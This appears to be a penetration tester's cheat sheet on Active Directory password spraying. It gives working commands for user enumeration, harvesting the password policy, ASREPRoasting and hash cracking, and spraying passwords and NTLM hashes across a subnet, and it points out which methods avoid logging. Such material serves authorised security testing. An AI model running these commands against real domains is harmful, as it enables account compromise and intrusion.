# Password Spraying

Once you are in the network and have enumerated live hosts using nmap, tcpdump or whatever tool.
We need to find a way to establish foothold in domain by gettng username and credentials (clear text or NTLM hash).
It is important to get this access in the early stages of pentest so we can perform more enumeration and attacks.

Note: It’s possible to do this using the SYSTEM account because it can impersonate the computer.
A computer object is treated as a domain user account (with some differences, such as authenticating across forest trusts). 


### Users Enumeration

- SMB NULL sessions allow an unauthenticated attacker to retrieve information from the domain, 
such as a complete listing of users, groups, computers, user account attributes, and the domain password policy.

 ```shell
 # using enum4linux
 enum4linux -U $DC_IP  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"

 # using rpcclient
 rpcclient -U "" -N $DC_IP
 rpcclient $> enumdomusers

 # using crackmapexec
 crackmapexec smb $DC_IP --users
 ```

- LDAP Anonymous Bind allow unauthenticated attackers to retrieve information from the domain, such as a complete
 listing of users, groups, computers, user account attributes, and the domain password policy.

 ```shell
 # using ldapsearch, we need to provide proper filter for getting usernames
 ldapsearch -H ldap://$DC_IP -x -b "DC=$DOMAIN,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "

 # using windapsearch, it is easier as we dont need filter
 windapsearch.py --dc-ip $DC_IP -u "" -U
 windapsearch.py --dc-ip $DC_IP -d $DOMAIN --custom "objectClass=*"
 ```

- Do some OSINT and try to get information related to people of the target company.
- You can use `linkedin2username` to create a possible worlist of users.

 ```shell
 linkedin2username.py -c company_name -n $DOMAIN -g -o linked_in_users.txt
 ```
- kerbrute is a stealthy option for domain account enumeration.
- It uses kerberos protocol to check if the username is valid or not.
- It takes advantage of kerberos pre-authentication, as the failures will not trigger logs or alerts.
 like Windows event ID 4625: An account failed to log on and event ID 4768: A Kerberos authentication
 ticket (TGT) was requested. This will only be triggered if Kerberos event logging is enabled via Group Policy.
- If we are successful with this, we should mention it in report

 ```shell
 kerbrute userenum -d $DOMAIN --dc $DC_IP wordlist.txt -o valid_ad_users

 # The tool sends TGT requests to the domain controller without Kerberos 
 # Pre-Authentication to perform username enumeration. If the KDC responds 
 # with the error PRINCIPAL UNKNOWN, the username is invalid.
 ```

Note: crackmapexec will provide you bad password count and time the latest bad attempt occured. This 
will help you in knowing which accounts are close to lockdown and you should avoid attacking them.
This count is maintained separate on each DC in case of multiple DCs.


### Getting Domain Password Policy

- Be careful not to lock accounts while spraying.
- Try to get domain password policy and prepare password list accordingly.
- We can get password policy from `SMB NULL Session` or `LDAP Anonymous Bind`.
- SMB NULL Session from Linux:

 ```shell
 # using rpc client
 rpcclient -U "" -N $DC_IP
 rpcclient $> getdompwinfo

 # using enum4linux
 enum4linux -P $DC_IP

 # using enum4linux-ng (better choice)
 enum4linux-ng -P $DC_IP -oA domain_info
 ```


- SMB NULL Session from Windows:

 ```shell
 net use \\DC01\ipc$ "" /u:""

 # you can use it to check users and passwords
 net use \\DC01\ipc$ "" /u:username
 net use \\DC01\ipc$ "password" /u:username
 ```

- LDAP Anonymous Bind from Linux:

 ```shell
 ldapsearch -H ldap://$DC_IP -x -b "DC=<$DOMAIN>,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
 ```

- LDAP Anonymous Bind from Windows:

 ```shell
 # built in tool
 net accounts

 # using powerview
 import-module .\PowerView.ps1
 Get-DomainPolicy

 # You can also use crackmapexec
 ```

- If you have tried other methods and dont have foothold, you may ask the client to
provide password policy.


## ASREPRoasting

```shell
# Match time with server to get correct ticket
sudo timedatectl set-ntp off
sudo rdate -n target_IP

# Using kerbrute
kerbrute userenum -d $DOMAIN --dc $DC_IP valid_users_list 

# Using powerview
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl

# Using impacket toolkit
GetNPUsers.py $DOMAIN/ -dc-ip $DC_IP -no-pass -usersfile valid_ad_users 

# Using rubeus
Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat

# Cracking the password
hashcat -m 18200 hash wordlist
```


## Password Spraying

- Once we have enumerated usernames, password policy and prepared wordlists accordingly, we can start
spraying passwords.

- For Linux:

 ```shell
 # using rpc client
 for u in $(cat $USERNAMES_LIST);do rpcclient -U "$u%$Password" -c "getusername;quit" $DC_IP | grep Authority; done

 # using kerbrute
 kerbrute passwordspray -d $DOMAIN --dc $DC_IP valid_users.txt  $PASSWORD
 
 # using crackmapexec
 crackmapexec smb $DC_IP -u valid_users.txt -p $PASSWORD | grep +
 ```

- If you get some hits, you can validate them:

 ```shell
 crackmapexec smb $DC_IP -u username -p password
 ```

- For Windows:
 ```shell
 # DomainPasswordSpray is a cool tool. If you run it when you are authenticated to domain
 # it will retrieve password policy, valid users and exclude accounts within 1 attempt of locking out
 Import-Module .\DomainPasswordSpray.ps1
 Invoke-DomainPasswordSpray -Password $PASSWORD -OutFile spray_success -ErrorAction SilentlyContinue
 ```

- Always look for patterns in password, try password reuse etc.
- Internal password spraying is possible from domain user account as well as local admin if you have creds, NTLM hash.
- If you have hash of local admin on a machine, you can spray it on entire subnet to check if it is valid on other machines as well.

 ```shell
 crackmapexec smb --local-auth $IP/23 -u administrator -H $HASH | grep +
 ```

### Other Targets
- Microsoft 0365
- Outlook Web Exchange
- Exchange Web Access
- Skype for Business
- Lync Server
- Microsoft Remote Desktop Services (RDS) Portals
- Citrix portals using AD authentication
- VDI implementations using AD authentication such as VMware Horizon
- VPN portals (Citrix, SonicWall, OpenVPN, Fortinet, etc. that use AD authentication)
- Custom web applications that use AD authentication